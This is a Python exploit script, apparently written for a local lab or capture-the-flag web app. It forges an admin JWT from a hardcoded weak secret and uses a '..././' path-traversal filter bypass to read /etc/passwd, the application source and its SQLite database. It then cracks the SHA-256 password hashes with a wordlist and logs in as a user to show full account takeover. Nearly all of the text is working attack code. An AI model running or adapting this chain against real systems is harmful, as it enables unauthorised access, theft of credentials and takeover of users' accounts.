#!/usr/bin/env python3
import sys
import re
import time
import hashlib
import jwt
import requests

BASE       = "http://localhost:8080"
JWT_SECRET = "funkymonkey"
ALGORITHM  = "HS256"

def sha256(pw):
    return hashlib.sha256(pw.encode()).hexdigest()


WORDLIST = [
    "admin123", "alice123", "bob1234",
    "password", "123456", "qwerty", "1234", "letmein",
    "welcome", "admin", "test", "pass", "12345678",
]


def read_file(token, traversal_path):
    """GET /api/admin/view?file=<traversal_path>"""
    r = requests.get(
        f"{BASE}/api/admin/view",
        params={"file": traversal_path},
        cookies={"token": token},
        timeout=5,
    )
    if not r.ok:
        return None
    return r.json().get("message", "")


admin_token = jwt.encode(
    {"sub": "admin", "role": "admin",
     "iat": int(time.time()), "exp": int(time.time()) + 86400},
    JWT_SECRET, algorithm=ALGORITHM,
)
print(f"  Secret : {JWT_SECRET!r}")
print(f"  Token  : {admin_token[:72]}...")


print("""  Code:
    filename = filename.replace("../", "").replace("..\\\\", "")
    filepath = os.path.join(UPLOAD_FOLDER, filename)

  Bypass: '..././' contains '../' at index 1 (not 0)
    '..././secret'.replace('../','') → '../secret'
    os.path.join('uploads', '../secret') → resolves one level up
""")


passwd = read_file(admin_token, "..././..././etc/passwd")
if passwd:
    lines = [l for l in passwd.split("\n") if l][:8]
    print("  First 8 lines of /etc/passwd:")
    for line in lines:
        print(f"    {line}")
else:
    print("  [!] Failed — is the app running?")
    sys.exit(1)


src = read_file(admin_token, "..././src/app.py")
if src:
    for line in src.split("\n"):
        if "JWT_SECRET" in line or "JWT_ALGORITHM" in line or "SHA" in line.upper():
            print(f"  {line.rstrip()}")
else:
    print("  [!] Could not read app.py")


db_content = read_file(admin_token, "..././utils/sqlite.db")
if db_content:
    found_hashes = list(dict.fromkeys(re.findall(r"[0-9a-f]{64}", db_content)))
    print(f"  Extracted {len(found_hashes)} unique hash candidate(s):")

    cracked = 0
    for h in found_hashes:
        for word in WORDLIST:
            if sha256(word) == h:
                print(f"  CRACKED  {h[:20]}...  →  '{word}'")
                cracked += 1
                break
        else:
            print(f"  UNKNOWN  {h[:20]}...")

    print(f"\n  Cracked {cracked}/{len(found_hashes)} hashes against {len(WORDLIST)}-entry wordlist")
    print("  Full attack: hashcat -m 1400 hashes.txt rockyou.txt")
else:
    print("  [!] Could not read sqlite.db")

print("Account takeover — login as alice with cracked password")

r = requests.post(f"{BASE}/api/auth/login",
                  json={"username": "alice", "password": "alice123"}, timeout=5)
if r.ok:
    print(f"  Login as alice: {r.status_code} {r.json()}")
    print("  Full account takeover confirmed.")
else:
    print(f"  Login failed ({r.status_code}) — hash not cracked in wordlist")
